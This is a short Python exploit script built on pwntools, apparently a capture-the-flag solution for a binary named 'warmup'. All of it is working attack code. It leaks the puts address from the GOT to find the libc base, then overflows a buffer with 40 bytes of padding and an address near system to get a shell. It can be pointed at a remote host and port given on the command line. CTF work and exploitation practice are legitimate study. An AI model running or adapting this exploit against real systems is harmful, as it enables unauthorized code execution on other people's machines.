#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
code = ELF('./warmup')
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

def exploit(r):
    def leak(addr):
        r.sendlineafter('for?\n', str(addr))
        res = int(r.recvline().strip(), 16)
        r.sendlineafter('name?\n', 'A'*0x20 + p64(start))
        return p64(res)
    start = 0x400730
    #d = DynELF(leak, code.got['puts'])#, elf=ELF('./warmup'))
    #system = d.lookup('system', 'libc')
    r.sendlineafter('?\n', str(code.got['puts']))
    leak = int(r.recvline(), 16)
    libc.address = leak - libc.sym['puts']
    raw_input('#')
    r.sendlineafter('?\n', flat(
        'A'*40,
        libc.sym['system']-378,
        ))
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        context.log_level = 'debug'
        libc = code.libc
        r = remote(sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) > 1:
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = ELF('/dbg64/libc-amd64.so')
    else:
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = code.libc
    exploit(r)

